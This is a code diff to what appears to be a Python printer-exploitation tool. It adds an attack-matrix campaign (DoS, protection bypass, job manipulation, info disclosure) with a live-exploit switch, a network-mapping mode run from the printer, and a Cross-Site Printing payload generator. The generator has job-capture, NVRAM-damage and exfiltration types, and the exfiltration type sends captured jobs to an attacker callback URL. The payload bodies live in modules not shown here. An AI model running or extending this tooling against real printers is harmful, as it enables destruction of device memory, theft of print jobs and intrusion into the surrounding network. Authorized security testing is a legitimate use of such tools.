@@ -170,6 +170,41 @@ def build_parser() -> argparse.ArgumentParser:
         action="store_true",
         help="Show which API features are configured and exit",
     )
+    # ── Full attack campaign (BlackHat matrix) ─────────────────────────────────
+    parser.add_argument(
+        "--attack-matrix",
+        action="store_true",
+        help=(
+            "Run the full attack matrix: DoS, Protection Bypass, Job Manipulation, "
+            "Info Disclosure. Probes all vectors from Müller et al. (2017) + 2024-2025 "
+            "CVEs. Use --no-dry to actually exploit (DANGEROUS)."
+        ),
+    )
+    parser.add_argument(
+        "--network-map",
+        action="store_true",
+        help=(
+            "Build a complete network map from the printer's perspective: SNMP routing, "
+            "PJL network vars, web config, subnet scan, WSD neighbors, attack paths."
+        ),
+    )
+    parser.add_argument(
+        "--xsp",
+        metavar="ATTACK_TYPE",
+        default=None,
+        choices=["info", "capture", "dos", "nvram", "exfil"],
+        help=(
+            "Generate Cross-Site Printing (XSP) + CORS spoofing payload. "
+            "Types: info (printer id), capture (job sniffer), dos (loop), "
+            "nvram (NVRAM damage), exfil (retrieve captured jobs)."
+        ),
+    )
+    parser.add_argument(
+        "--xsp-callback",
+        metavar="URL",
+        default="",
+        help="Attacker callback URL for XSP --exfil payloads",
+    )
     return parser
 
 
@@ -464,6 +499,90 @@ def _run_attack_modules(args) -> None:
         except Exception as exc:
             output().errmsg(f"Implant error: {exc}")
 
+    # ── Full attack matrix campaign ────────────────────────────────────────────
+    if getattr(args, 'attack_matrix', False):
+        dry   = not getattr(args, 'no_dry', False)
+        nm    = getattr(args, 'network_map', False)
+        output().green(
+            f"\n>> Attack Matrix Campaign: {target} "
+            f"[{'DRY-RUN' if dry else 'LIVE EXPLOIT'}]"
+        )
+        if not dry:
+            output().warning(
+                "[!] LIVE EXPLOIT MODE — destructive actions WILL be executed. "
+                "Ensure you have explicit written authorization."
+            )
+        try:
+            # Quick banner grab to get printer context
+            langs:   list = []
+            ports:   list = []
+            make_:   str  = ''
+            model_:  str  = ''
+            fw_:     str  = ''
+            try:
+                from utils.banner_grabber import grab_all
+                fp = grab_all(target, timeout=timeout)
+                langs  = fp.printer_langs
+                ports  = fp.open_ports
+                make_  = fp.make
+                model_ = fp.model
+                fw_    = fp.firmware_version
+            except Exception:
+                pass
+
+            from core.attack_orchestrator import run_campaign, print_campaign_report
+            report = run_campaign(
+                host=target, make=make_, model=model_, firmware=fw_,
+                printer_langs=langs, open_ports=ports,
+                dry_run=dry, timeout=timeout,
+                run_netmap=nm, verbose=True,
+            )
+            print_campaign_report(report)
+        except Exception as exc:
+            output().errmsg(f"Attack matrix error: {exc}")
+
+    # ── Network map ────────────────────────────────────────────────────────────
+    if getattr(args, 'network_map', False) and not getattr(args, 'attack_matrix', False):
+        output().green(f"\n>> Network Map from Printer Perspective: {target}")
+        try:
+            from protocols.network_map import build_network_map, print_network_map
+            nm = build_network_map(target, timeout=timeout, verbose=True)
+            print_network_map(nm)
+        except Exception as exc:
+            output().errmsg(f"Network map error: {exc}")
+
+    # ── XSP payload generation ────────────────────────────────────────────────
+    if getattr(args, 'xsp', None):
+        attack = args.xsp
+        cb     = getattr(args, 'xsp_callback', '')
+        output().green(
+            f"\n>> Cross-Site Printing (XSP) Payload Generator: {target} [{attack}]"
+        )
+        try:
+            from protocols.network_map import generate_xsp_payload
+            payloads = generate_xsp_payload(
+                printer_ip=target, printer_port=9100,
+                attack_type=attack, callback_url=cb, exfil_url=cb,
+            )
+            # Save HTML to .log/
+            import os as _os
+            log_dir = _os.path.join(
+                _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))), '.log'
+            )
+            _os.makedirs(log_dir, exist_ok=True)
+            html_path = _os.path.join(log_dir, f'xsp_{attack}_{target}.html')
+            with open(html_path, 'w', encoding='utf-8') as fh:
+                fh.write(payloads['html'])
+            js_path = _os.path.join(log_dir, f'xsp_{attack}_{target}.js')
+            with open(js_path, 'w', encoding='utf-8') as fh:
+                fh.write(payloads['javascript'])
+            output().green(f"[+] XSP HTML payload  → {html_path}")
+            output().green(f"[+] XSP JS payload    → {js_path}")
+            output().message("\n[PostScript payload preview]")
+            print(payloads['postscript'][:300])
+        except Exception as exc:
+            output().errmsg(f"XSP error: {exc}")
+
 
 # --------------------------------------------------------------------------- #
 # Banner
@@ -608,7 +727,8 @@ def main() -> None:
 
     # ── Attack / audit dispatchers ────────────────────────────────────────────
     _needs_target = ('ipp', 'ipp_submit', 'pivot', 'storage', 'firmware',
-                     'firmware_reset', 'payload', 'implant')
+                     'firmware_reset', 'payload', 'implant',
+                     'attack_matrix', 'network_map', 'xsp')
     _any_attack = any(getattr(args, a.replace('-', '_'), None)
                       for a in _needs_target)
     if _any_attack:
